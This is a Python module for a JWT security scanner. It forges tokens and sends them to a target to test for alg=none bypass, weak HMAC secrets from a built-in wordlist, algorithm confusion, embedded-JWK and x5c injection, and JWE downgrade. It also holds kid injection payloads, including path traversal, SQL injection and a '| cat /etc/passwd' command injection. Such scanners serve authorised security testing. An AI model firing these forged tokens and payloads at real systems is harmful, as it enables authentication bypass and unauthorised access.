"""
JWT (JSON Web Token) Security Scanner.

Features:
  - Detects JWT tokens in cookies, headers, and responses
  - Algorithm confusion attacks (none, HS256 with public key)
  - RS256→HS256 algorithm confusion (key confusion attack)
  - Weak secret brute-force (common secrets)
  - Expired token detection
  - Missing claims validation
  - JWK/JWKS endpoint discovery
  - kid parameter injection (path traversal, SQLi)
  - x5u / x5c header injection
  - JWE downgrade detection
  - Embedded JWK injection (CVE-2018-0114)
"""

import base64
import hashlib
import hmac
import json
import re
import time

from secprobe.config import Severity
from secprobe.core.exceptions import TargetUnreachableError
from secprobe.scanners.smart_scanner import SmartScanner
from secprobe.utils import normalize_url, print_status, print_finding


COMMON_JWT_SECRETS = [
    "secret", "password", "123456", "admin", "key", "jwt_secret",
    "changeme", "test", "default", "supersecret", "mysecret",
    "jwt", "token", "auth", "api_key", "s3cr3t", "qwerty",
    "letmein", "welcome", "monkey", "dragon", "master",
    "HS256secret", "your-256-bit-secret", "secret-key",
]


class JWTScanner(SmartScanner):
    name = "JWT Scanner"
    description = "Analyze JWT token security"

    def scan(self):
        url = normalize_url(self.config.target)
        print_status(f"JWT security analysis on {url}", "progress")

        try:
            resp = self.http_client.get(url)
        except TargetUnreachableError as e:
            print_status(f"Cannot reach target: {e}", "error")
            self.result.error = str(e)
            return

        # ── Find JWT tokens ──────────────────────────────────────────
        tokens = self._find_tokens(resp)

        if not tokens:
            print_status("No JWT tokens found.", "info")
            self.add_finding(
                title="No JWT tokens detected",
                severity=Severity.INFO,
                description="No JWT tokens found in cookies, headers, or response body.",
                category="JWT Security",
            )
            return

        print_status(f"Found {len(tokens)} JWT token(s)", "info")

        for token_info in tokens:
            token = token_info["token"]
            source = token_info["source"]

            # Decode and analyze
            decoded = self._decode_jwt(token)
            if not decoded:
                continue

            header, payload_data = decoded

            # ── Algorithm analysis ────────────────────────────────────
            alg = header.get("alg", "unknown")
            print_status(f"JWT ({source}): alg={alg}", "info")

            if alg.lower() == "none" or alg == "":
                self.add_finding(
                    title="JWT - Algorithm 'none' accepted",
                    severity=Severity.CRITICAL,
                    description="JWT uses 'none' algorithm — no signature verification.",
                    recommendation="Always enforce algorithm validation server-side.",
                    evidence=f"Source: {source}\nAlgorithm: {alg}",
                    category="JWT Security",
                    url=url,
                    cwe="CWE-327",
                )
                print_finding(Severity.CRITICAL, "JWT alg=none!")

            if alg in ("HS256", "HS384", "HS512"):
                # Test 'none' algorithm bypass
                self._test_none_bypass(url, token, source)
                # Brute-force weak secrets
                self._test_weak_secrets(url, token, alg, source)

            # ── Claim analysis ────────────────────────────────────────
            self._analyze_claims(url, payload_data, source)

            # ── Header issues ─────────────────────────────────────────
            if "kid" in header:
                self.add_finding(
                    title="JWT - Key ID (kid) present",
                    severity=Severity.LOW,
                    description=f"JWT contains kid header: {header['kid']}. May be exploitable for injection.",
                    recommendation="Validate kid parameter against injection attacks.",
                    evidence=f"kid: {header['kid']}",
                    category="JWT Security",
                    url=url,
                    cwe="CWE-20",
                )

            if "jku" in header:
                self.add_finding(
                    title="JWT - JKU header present (SSRF risk)",
                    severity=Severity.HIGH,
                    description=f"JWT contains jku (JWK Set URL): {header['jku']}",
                    recommendation="Whitelist jku URLs. Never fetch untrusted JWK endpoints.",
                    evidence=f"jku: {header['jku']}",
                    category="JWT Security",
                    url=url,
                    cwe="CWE-918",
                )

        # ── Check for JWKS endpoint ──────────────────────────────────
        self._check_jwks_endpoint(url)

        # ── Advanced attacks on discovered tokens ─────────────────────
        for token_info in tokens:
            token = token_info["token"]
            source = token_info["source"]
            decoded = self._decode_jwt(token)
            if not decoded:
                continue
            header, payload_data = decoded
            alg = header.get("alg", "unknown")

            # RS256→HS256 algorithm confusion
            if alg.startswith("RS") or alg.startswith("PS") or alg.startswith("ES"):
                self._test_alg_confusion(url, token, header, payload_data, source)

            # kid parameter injection
            if "kid" in header:
                self._test_kid_injection(url, token, header, payload_data, source)

            # x5u header injection
            self._test_x5u_injection(url, token, header, payload_data, source)

            # Embedded JWK injection (CVE-2018-0114)
            self._test_embedded_jwk(url, token, header, payload_data, source)

            # JWE downgrade
            if header.get("enc"):
                self._test_jwe_downgrade(url, token, header, payload_data, source)

    def _find_tokens(self, resp):
        tokens = []
        jwt_pattern = re.compile(r'eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]*')

        # Check cookies
        for cookie_name, cookie_value in resp.cookies.items():
            if jwt_pattern.match(cookie_value):
                tokens.append({"token": cookie_value, "source": f"cookie:{cookie_name}"})

        # Check Authorization header echo
        auth_header = resp.headers.get("Authorization", "")
        if "Bearer " in auth_header:
            token = auth_header.split("Bearer ")[-1].strip()
            if jwt_pattern.match(token):
                tokens.append({"token": token, "source": "Authorization header"})

        # Check response body
        for match in jwt_pattern.finditer(resp.text):
            t = match.group(0)
            if not any(t == ti["token"] for ti in tokens):
                tokens.append({"token": t, "source": "response body"})

        # Check Set-Cookie headers
        for header_val in resp.headers.get("Set-Cookie", "").split(","):
            for match in jwt_pattern.finditer(header_val):
                t = match.group(0)
                if not any(t == ti["token"] for ti in tokens):
                    tokens.append({"token": t, "source": "Set-Cookie"})

        return tokens

    def _decode_jwt(self, token):
        try:
            parts = token.split(".")
            if len(parts) < 2:
                return None

            def _b64decode(s):
                s += "=" * (4 - len(s) % 4)
                return base64.urlsafe_b64decode(s)

            header = json.loads(_b64decode(parts[0]))
            payload_data = json.loads(_b64decode(parts[1]))
            return header, payload_data
        except Exception:
            return None

    def _test_none_bypass(self, url, token, source):
        decoded = self._decode_jwt(token)
        if not decoded:
            return

        header, payload_data = decoded

        for none_alg in ["none", "None", "NONE", "nOnE"]:
            forged_header = {**header, "alg": none_alg}
            h_b64 = base64.urlsafe_b64encode(json.dumps(forged_header).encode()).rstrip(b"=").decode()
            p_b64 = base64.urlsafe_b64encode(json.dumps(payload_data).encode()).rstrip(b"=").decode()
            forged_token = f"{h_b64}.{p_b64}."

            try:
                resp = self.http_client.get(url, headers={"Authorization": f"Bearer {forged_token}"})
                if resp.status_code == 200 and "unauthorized" not in resp.text.lower():
                    self.add_finding(
                        title=f"JWT - Algorithm 'none' bypass accepted",
                        severity=Severity.CRITICAL,
                        description=f"Server accepted JWT with alg={none_alg} and empty signature.",
                        recommendation="Enforce algorithm allowlist server-side.",
                        evidence=f"Forged alg: {none_alg}\nSource: {source}",
                        category="JWT Security",
                        url=url,
                        cwe="CWE-327",
                    )
                    print_finding(Severity.CRITICAL, f"JWT none bypass: {none_alg}")
                    return
            except Exception:
                continue

    def _test_weak_secrets(self, url, token, alg, source):
        parts = token.split(".")
        if len(parts) != 3:
            return

        signing_input = f"{parts[0]}.{parts[1]}".encode()
        original_sig = parts[2]

        hash_func = {
            "HS256": hashlib.sha256,
            "HS384": hashlib.sha384,
            "HS512": hashlib.sha512,
        }.get(alg)

        if not hash_func:
            return

        for secret in COMMON_JWT_SECRETS:
            computed = hmac.new(secret.encode(), signing_input, hash_func).digest()
            computed_sig = base64.urlsafe_b64encode(computed).rstrip(b"=").decode()
            if computed_sig == original_sig:
                self.add_finding(
                    title=f"JWT - Weak signing secret: '{secret}'",
                    severity=Severity.CRITICAL,
                    description=f"JWT signed with easily guessable secret: {secret}",
                    recommendation="Use strong random secrets (256+ bits). Rotate signing keys.",
                    evidence=f"Secret: {secret}\nAlgorithm: {alg}\nSource: {source}",
                    category="JWT Security",
                    url=url,
                    cwe="CWE-521",
                )
                print_finding(Severity.CRITICAL, f"JWT weak secret: '{secret}'")
                return

    def _analyze_claims(self, url, payload_data, source):
        import time as _time

        now = _time.time()

        # Expiration check
        exp = payload_data.get("exp")
        if exp:
            if isinstance(exp, (int, float)) and exp < now:
                self.add_finding(
                    title="JWT - Expired token in use",
                    severity=Severity.MEDIUM,
                    description=f"JWT has expired (exp: {exp})",
                    recommendation="Validate token expiration server-side.",
                    evidence=f"exp: {exp}\nSource: {source}",
                    category="JWT Security",
                    url=url,
                    cwe="CWE-613",
                )
        else:
            self.add_finding(
                title="JWT - No expiration claim (exp)",
                severity=Severity.MEDIUM,
                description="JWT does not contain exp claim — tokens never expire.",
                recommendation="Always include exp claim with reasonable TTL.",
                evidence=f"Source: {source}\nClaims: {list(payload_data.keys())}",
                category="JWT Security",
                url=url,
                cwe="CWE-613",
            )

        # Issuer check
        if "iss" not in payload_data:
            self.add_finding(
                title="JWT - No issuer claim (iss)",
                severity=Severity.LOW,
                description="JWT missing iss claim. Cannot verify token origin.",
                recommendation="Include iss claim and validate it server-side.",
                evidence=f"Source: {source}",
                category="JWT Security",
                url=url,
                cwe="CWE-20",
            )

        # Sensitive data in payload
        sensitive_keys = ["password", "passwd", "secret", "ssn", "credit_card", "cc_number"]
        for key in payload_data:
            if key.lower() in sensitive_keys:
                self.add_finding(
                    title=f"JWT - Sensitive data in payload: '{key}'",
                    severity=Severity.HIGH,
                    description=f"JWT contains potentially sensitive claim: {key}",
                    recommendation="Never store sensitive data in JWT payloads (base64 != encryption).",
                    evidence=f"Claim: {key}\nSource: {source}",
                    category="JWT Security",
                    url=url,
                    cwe="CWE-312",
                )

    def _check_jwks_endpoint(self, url):
        from urllib.parse import urljoin
        jwks_paths = [
            "/.well-known/jwks.json",
            "/jwks.json",
            "/.well-known/openid-configuration",
            "/oauth/jwks",
        ]
        for path in jwks_paths:
            test_url = urljoin(url, path)
            try:
                resp = self.http_client.get(test_url, allow_redirects=False)
                if resp.status_code == 200 and ("keys" in resp.text or "jwks_uri" in resp.text):
                    self.add_finding(
                        title=f"JWKS endpoint found: {path}",
                        severity=Severity.INFO,
                        description=f"JSON Web Key Set endpoint accessible at {test_url}",
                        recommendation="Ensure JWKS endpoint doesn't leak private keys.",
                        evidence=f"URL: {test_url}\nSize: {len(resp.text)}B",
                        category="JWT Security",
                        url=test_url,
                        cwe="CWE-200",
                    )

                    # Check if JWKS leaks private key material
                    try:
                        jwks_data = json.loads(resp.text)
                        if "keys" in jwks_data:
                            for key in jwks_data["keys"]:
                                # Private key fields that should NEVER be in JWKS
                                private_fields = ["d", "p", "q", "dp", "dq", "qi"]
                                leaked = [f for f in private_fields if f in key]
                                if leaked:
                                    self.add_finding(
                                        title="JWKS leaks private key material!",
                                        severity=Severity.CRITICAL,
                                        description=f"JWKS endpoint exposes private key fields: {leaked}",
                                        recommendation="Remove private key parameters from JWKS. Only public key material should be exposed.",
                                        evidence=f"URL: {test_url}\nLeaked fields: {leaked}\nKey ID: {key.get('kid', 'N/A')}",
                                        category="JWT Security",
                                        url=test_url,
                                        cwe="CWE-321",
                                    )
                                    print_finding(Severity.CRITICAL, "🔥 JWKS leaks private keys!")
                    except (json.JSONDecodeError, TypeError):
                        pass

                    break
            except Exception:
                continue

    # ── Advanced JWT Attack Methods ──────────────────────────────────

    def _test_alg_confusion(self, url, token, header, payload_data, source):
        """RS256→HS256 algorithm confusion attack.
        
        If server uses RSA (RS256) but doesn't validate the algorithm,
        we can switch to HS256 and sign with the server's public key.
        """
        print_status("Testing RS256→HS256 algorithm confusion…", "progress")

        # First, try to fetch the server's public key from JWKS
        from urllib.parse import urljoin
        public_key = None

        jwks_paths = ["/.well-known/jwks.json", "/jwks.json", "/oauth/jwks"]
        for path in jwks_paths:
            try:
                resp = self.http_client.get(urljoin(url, path))
                if resp.status_code == 200:
                    data = json.loads(resp.text)
                    if "keys" in data and data["keys"]:
                        # Found JWKS — flag the confusion possibility
                        self.add_finding(
                            title="JWT - Algorithm confusion attack possible",
                            severity=Severity.HIGH,
                            description=(
                                f"JWT uses {header.get('alg')} and JWKS endpoint is accessible.\n"
                                "An attacker could switch to HS256 and sign with the public key,\n"
                                "bypassing signature verification if the server doesn't validate the algorithm."
                            ),
                            recommendation=(
                                "Enforce algorithm allowlist server-side. "
                                "Never accept HS256 for endpoints expecting RS256."
                            ),
                            evidence=f"Original alg: {header.get('alg')}\nJWKS: {path}\nSource: {source}",
                            category="JWT Security",
                            url=url,
                            cwe="CWE-327",
                        )
                        print_finding(Severity.HIGH, "Algorithm confusion: JWKS public key accessible")

                        # Actually attempt the confusion attack
                        # Forge token with HS256 using a common/empty key
                        for test_key in [b"", b"\n", b" "]:
                            confused_header = {**header, "alg": "HS256"}
                            h_b64 = base64.urlsafe_b64encode(
                                json.dumps(confused_header).encode()
                            ).rstrip(b"=").decode()
                            p_b64 = base64.urlsafe_b64encode(
                                json.dumps(payload_data).encode()
                            ).rstrip(b"=").decode()
                            signing_input = f"{h_b64}.{p_b64}".encode()
                            sig = hmac.new(test_key, signing_input, hashlib.sha256).digest()
                            sig_b64 = base64.urlsafe_b64encode(sig).rstrip(b"=").decode()
                            forged = f"{h_b64}.{p_b64}.{sig_b64}"

                            try:
                                r = self.http_client.get(
                                    url, headers={"Authorization": f"Bearer {forged}"}
                                )
                                if r.status_code == 200 and "unauthorized" not in r.text.lower():
                                    self.add_finding(
                                        title="JWT - Algorithm confusion EXPLOITED!",
                                        severity=Severity.CRITICAL,
                                        description="Server accepted HS256-signed token when RS256 was expected.",
                                        recommendation="IMMEDIATELY enforce algorithm validation.",
                                        evidence=f"Forged alg: HS256\nKey used: {repr(test_key)}",
                                        category="JWT Security",
                                        url=url,
                                        cwe="CWE-327",
                                    )
                                    print_finding(Severity.CRITICAL, "🔥 Algorithm confusion EXPLOITED!")
                                    return
                            except Exception:
                                continue
                        return
            except Exception:
                continue

    def _test_kid_injection(self, url, token, header, payload_data, source):
        """Test kid parameter for path traversal and SQL injection."""
        print_status("Testing kid parameter injection…", "progress")
        original_kid = header.get("kid", "")

        kid_payloads = [
            # Path traversal — use known file with known content as HMAC key
            ("../../../dev/null", b"", "Path traversal to /dev/null"),
            ("../../../../../../dev/null", b"", "Deep path traversal"),
            ("../../../etc/hostname", b"", "Path traversal to /etc/hostname"),
            # SQL injection in kid
            ("' UNION SELECT 'key' -- ", b"key", "SQLi UNION in kid"),
            ("' OR '1'='1", b"", "SQLi OR bypass in kid"),
            # Command injection in kid
            ("| cat /etc/passwd", b"", "Command injection in kid"),
        ]

        for kid_value, signing_key, desc in kid_payloads:
            forged_header = {**header, "alg": "HS256", "kid": kid_value}
            h_b64 = base64.urlsafe_b64encode(
                json.dumps(forged_header).encode()
            ).rstrip(b"=").decode()
            p_b64 = base64.urlsafe_b64encode(
                json.dumps(payload_data).encode()
            ).rstrip(b"=").decode()

            signing_input = f"{h_b64}.{p_b64}".encode()
            sig = hmac.new(signing_key, signing_input, hashlib.sha256).digest()
            sig_b64 = base64.urlsafe_b64encode(sig).rstrip(b"=").decode()
            forged = f"{h_b64}.{p_b64}.{sig_b64}"

            try:
                resp = self.http_client.get(
                    url, headers={"Authorization": f"Bearer {forged}"}
                )
                if resp.status_code == 200 and "unauthorized" not in resp.text.lower():
                    self.add_finding(
                        title=f"JWT - kid injection accepted: {desc}",
                        severity=Severity.CRITICAL,
                        description=(
                            f"Server accepted JWT with injected kid parameter.\n"
                            f"kid value: {kid_value}\n"
                            f"Attack: {desc}"
                        ),
                        recommendation=(
                            "Sanitize kid parameter. Never use it in file paths or SQL queries directly."
                        ),
                        evidence=f"kid: {kid_value}\nOriginal kid: {original_kid}\nHTTP {resp.status_code}",
                        category="JWT Security",
                        url=url,
                        cwe="CWE-22",
                    )
                    print_finding(Severity.CRITICAL, f"🔥 kid injection: {desc}")
                    return

                # Check for error-based detection (SQL errors, file errors)
                error_patterns = [
                    "sql", "syntax", "mysql", "postgresql", "sqlite",
                    "no such file", "file not found", "permission denied",
                    "ENOENT", "stack trace", "traceback",
                ]
                for pattern in error_patterns:
                    if pattern in resp.text.lower():
                        self.add_finding(
                            title=f"JWT - kid injection causes errors: {desc}",
                            severity=Severity.HIGH,
                            description=f"Injected kid value causes server errors, confirming injection point.",
                            recommendation="Sanitize kid parameter against path traversal and SQLi.",
                            evidence=f"kid: {kid_value}\nError pattern: {pattern}\nHTTP {resp.status_code}",
                            category="JWT Security",
                            url=url,
                            cwe="CWE-22",
                        )
                        print_finding(Severity.HIGH, f"kid injection error: {desc}")
                        return

            except Exception:
                continue

    def _test_x5u_injection(self, url, token, header, payload_data, source):
        """Test x5u/x5c header injection for certificate spoofing."""
        print_status("Testing x5u/x5c header injection…", "progress")

        # x5u: URL to X.509 certificate chain — if server fetches, it's SSRF + forgery
        if self.oob_available:
            oob_token = self.oob_generate_token(url, "x5u", "jwt_x5u", "x5u injection")
            oob_url = self.oob_get_url(oob_token)

            forged_header = {**header, "x5u": oob_url}
            h_b64 = base64.urlsafe_b64encode(
                json.dumps(forged_header).encode()
            ).rstrip(b"=").decode()
            p_b64 = base64.urlsafe_b64encode(
                json.dumps(payload_data).encode()
            ).rstrip(b"=").decode()
            # Use original signature (may fail, but we're testing if server fetches x5u)
            parts = token.split(".")
            sig = parts[2] if len(parts) == 3 else ""
            forged = f"{h_b64}.{p_b64}.{sig}"

            try:
                self.http_client.get(url, headers={"Authorization": f"Bearer {forged}"})
            except Exception:
                pass

        # x5c: Embedded certificate — test if server accepts arbitrary certs
        # Use a minimal self-signed cert stub
        fake_cert_b64 = base64.b64encode(b"FAKE_CERT_FOR_TESTING").decode()
        forged_header = {**header, "x5c": [fake_cert_b64]}
        h_b64 = base64.urlsafe_b64encode(
            json.dumps(forged_header).encode()
        ).rstrip(b"=").decode()
        p_b64 = base64.urlsafe_b64encode(
            json.dumps(payload_data).encode()
        ).rstrip(b"=").decode()
        parts = token.split(".")
        sig = parts[2] if len(parts) == 3 else ""
        forged = f"{h_b64}.{p_b64}.{sig}"

        try:
            resp = self.http_client.get(url, headers={"Authorization": f"Bearer {forged}"})
            if resp.status_code == 200 and "unauthorized" not in resp.text.lower():
                self.add_finding(
                    title="JWT - x5c header injection accepted",
                    severity=Severity.CRITICAL,
                    description="Server accepted JWT with forged x5c (certificate chain) header.",
                    recommendation="Never trust x5c claims without verifying against known CA.",
                    evidence=f"x5c injected with fake certificate\nHTTP {resp.status_code}",
                    category="JWT Security",
                    url=url,
                    cwe="CWE-295",
                )
                print_finding(Severity.CRITICAL, "🔥 x5c injection accepted!")
        except Exception:
            pass

    def _test_embedded_jwk(self, url, token, header, payload_data, source):
        """Test embedded JWK injection (CVE-2018-0114).
        
        Some servers trust the JWK embedded in the JWT header itself,
        allowing an attacker to sign with their own key.
        """
        print_status("Testing embedded JWK injection (CVE-2018-0114)…", "progress")

        # Create a minimal embedded JWK with HS256
        # If server trusts this, it uses our key to verify
        embedded_jwk = {
            "kty": "oct",
            "k": base64.urlsafe_b64encode(b"attacker_controlled_key").rstrip(b"=").decode(),
        }

        forged_header = {**header, "alg": "HS256", "jwk": embedded_jwk}
        h_b64 = base64.urlsafe_b64encode(
            json.dumps(forged_header).encode()
        ).rstrip(b"=").decode()
        p_b64 = base64.urlsafe_b64encode(
            json.dumps(payload_data).encode()
        ).rstrip(b"=").decode()

        signing_input = f"{h_b64}.{p_b64}".encode()
        sig = hmac.new(b"attacker_controlled_key", signing_input, hashlib.sha256).digest()
        sig_b64 = base64.urlsafe_b64encode(sig).rstrip(b"=").decode()
        forged = f"{h_b64}.{p_b64}.{sig_b64}"

        try:
            resp = self.http_client.get(url, headers={"Authorization": f"Bearer {forged}"})
            if resp.status_code == 200 and "unauthorized" not in resp.text.lower():
                self.add_finding(
                    title="JWT - Embedded JWK injection (CVE-2018-0114)",
                    severity=Severity.CRITICAL,
                    description=(
                        "Server trusts the JWK embedded in the JWT header.\n"
                        "An attacker can forge any token by embedding their own signing key."
                    ),
                    recommendation="Never trust JWK/jwk embedded in JWT headers. Use server-side key store.",
                    evidence=f"Embedded JWK accepted\nHTTP {resp.status_code}",
                    category="JWT Security",
                    url=url,
                    cwe="CWE-345",
                )
                print_finding(Severity.CRITICAL, "🔥 Embedded JWK injection (CVE-2018-0114)!")
        except Exception:
            pass

    def _test_jwe_downgrade(self, url, token, header, payload_data, source):
        """Test JWE downgrade — strip encryption, send as JWS."""
        print_status("Testing JWE→JWS downgrade…", "progress")

        # Try sending as unencrypted JWS (strip enc/alg encryption headers)
        downgraded = {k: v for k, v in header.items() if k not in ("enc", "zip")}
        downgraded["alg"] = "none"

        h_b64 = base64.urlsafe_b64encode(
            json.dumps(downgraded).encode()
        ).rstrip(b"=").decode()
        p_b64 = base64.urlsafe_b64encode(
            json.dumps(payload_data).encode()
        ).rstrip(b"=").decode()
        forged = f"{h_b64}.{p_b64}."

        try:
            resp = self.http_client.get(url, headers={"Authorization": f"Bearer {forged}"})
            if resp.status_code == 200 and "unauthorized" not in resp.text.lower():
                self.add_finding(
                    title="JWT - JWE→JWS downgrade accepted",
                    severity=Severity.CRITICAL,
                    description="Server accepted downgraded JWE token as plain JWS with alg=none.",
                    recommendation="Enforce encryption requirements. Reject tokens missing expected encryption.",
                    evidence=f"Original had enc={header.get('enc')}\nDowngraded accepted",
                    category="JWT Security",
                    url=url,
                    cwe="CWE-757",
                )
                print_finding(Severity.CRITICAL, "🔥 JWE→JWS downgrade!")
        except Exception:
            pass
